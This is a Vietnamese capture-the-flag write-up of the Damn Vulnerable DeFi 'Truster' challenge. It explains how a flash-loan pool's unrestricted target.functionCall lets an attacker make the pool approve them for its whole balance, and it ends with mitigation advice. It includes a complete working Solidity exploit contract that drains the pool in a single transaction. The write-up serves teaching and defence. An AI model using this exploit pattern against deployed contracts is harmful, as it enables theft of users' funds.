---
title: "[DVD-03] Truster: arbitrary call khiến pool tự approve token cho attacker"
description: "TrusterLenderPool cho phép borrower chỉ định target và calldata tùy ý trong flashLoan, rồi pool tự thực thi lời gọi đó trong context của chính mình. Attacker chỉ cần khiến pool gọi token.approve(attacker, toàn bộ số dư) trong một khoản vay amount = 0, sau đó rút sạch pool bằng transferFrom — tất cả trong một giao dịch duy nhất."
pubDate: 2026-08-19
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "arbitrary-external-call", "approve"]
draft: false
challenge: "damn-vulnerable-defi"
difficulty: "easy"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Truster là một bài kinh điển về **arbitrary external call**. Hàm `flashLoan()` của pool nhận tham số `target` và `data` do người gọi tự do cung cấp, rồi thực thi lời gọi đó **từ context của pool** — nghĩa là `msg.sender` bên trong lời gọi chính là pool. Attacker yêu cầu pool gọi `token.approve(attacker, 1_000_000e18)`, sau đó dùng `transferFrom` kéo toàn bộ token ra khỏi pool. Vì số tiền vay được đặt bằng 0, điều kiện hoàn trả không bao giờ bị vi phạm. Toàn bộ exploit nằm gọn trong constructor của một contract, nên player chỉ tốn đúng một giao dịch — yêu cầu bắt buộc của challenge.

## Bối cảnh & Mục tiêu

Contract duy nhất bị tấn công là **TrusterLenderPool** (`src/truster/TrusterLenderPool.sol`), một flash lender cổ điển:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

Trạng thái ban đầu (`test/truster/Truster.t.sol`): pool giữ 1.000.000 DVT; player không có token nào.

Điều kiện thắng (`_isSolved()`): player thực hiện **đúng 1 giao dịch**; pool hết token; recovery nhận đủ 1.000.000 DVT.

## Phân tích lỗ hổng

Có hai vấn đề cộng hưởng trong `flashLoan()`:

1. **`target.functionCall(data)` không giới hạn.** Người gọi khoản vay tự chọn `target` và `data`. Lời gọi được pool thực thi trực tiếp, nên mọi hàm được gọi đều chạy với `msg.sender == address(pool)`. Pool có thể bị tác động để thực hiện bất kỳ hành động nào mà chính nó được phép làm với token của nó — ở đây là `approve`.

2. **Điều kiện hoàn trả chỉ so sánh số dư token của pool.** `balanceBefore` được đo **trước** lời gọi tùy ý. Nếu đặt `amount = 0`, không có token nào bị chuyển ra, và lời gọi tùy ý không làm giảm `token.balanceOf(pool)` (approve không động vào số dư), nên check `RepayFailed` luôn pass.

Kết hợp lại: attacker gọi `flashLoan(0, attacker, token, abi.encodeCall(token.approve, (attacker, amount)))`. Pool chuyển 0 token, tự gọi `token.approve(attacker, amount)` với tư cách chính nó, rồi kiểm tra số dư — không đổi — và trả về `true`. Kể từ thời điểm này pool đã ủy quyền toàn bộ token cho attacker.

## Khai thác

Để thỏa mãn điều kiện "một giao dịch", toàn bộ exploit được đặt trong constructor của contract `TrusterAttacker`. Khi player thực hiện `new TrusterAttacker(pool, token, recovery)`, CREATE tăng nonce của player lên đúng 1, và mọi thứ chạy trong constructor:

```solidity
contract TrusterAttacker {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 amount = token.balanceOf(address(pool));
        // flashLoan(amount=0, borrower=bất kỳ, target=token, data=approve(this, amount))
        // pool tự gọi target.functionCall(data) -> msg.sender lúc đó là pool
        // -> pool tự approve cho contract này.
        pool.flashLoan(0, address(this), address(token), abi.encodeCall(token.approve, (address(this), amount)));
        token.transferFrom(address(pool), recovery, amount);
    }
}
```

Diễn biến:

1. Constructor đọc số dư pool (1.000.000 DVT).
2. Gọi `pool.flashLoan(0, this, token, approve(this, 1M))` — pool thực thi `approve` trong context của nó, cấp allowance tối đa cho `TrusterAttacker`.
3. `TrusterAttacker` gọi `token.transferFrom(pool, recovery, 1M)` — rút toàn bộ token.
4. Sau constructor, player chỉ tốn 1 giao dịch; nonce = 1, mọi assert đều đạt.

## Kết quả

Chạy `forge test --match-contract TrusterChallenge -vv`:

```
Ran 2 tests for test/truster/Truster.t.sol:TrusterChallenge
[PASS] test_assertInitialState() (gas: 21982)
[PASS] test_truster() (gas: 102246)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Không bao giờ để borrower chỉ định arbitrary call.** Flash loan nên gọi callback theo interface cố định (ví dụ `IFlashLoanReceiver.onFlashLoan(...)`) trên chính `borrower`, không cho phép chỉ định `target` + `data` tùy ý. Nếu cần mở rộng, phải có whitelist (target, selector) hoặc kiểm tra calldata theo allowlist.
- **Kiểm tra hoàn trả theo từng khoản vay, không theo tổng balance.** So sánh balance trước/sau có thể bị qua mặt khi khoản vay không thực sự rời pool (amount = 0) hoặc khi pool vừa nhận thêm token. Nên ghi nhận `balanceBefore` và yêu cầu `transferFrom(borrower, amount + fee)` như ERC3156 chuẩn.
- **Dùng pull-based payment:** pool chủ động `transferFrom` tiền hoàn trả thay vì tin vào allowance có sẵn do attacker tạo ra.

## Tham khảo

- Challenge: [Truster — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)
- Source: `src/truster/TrusterLenderPool.sol`, `test/truster/Truster.t.sol`
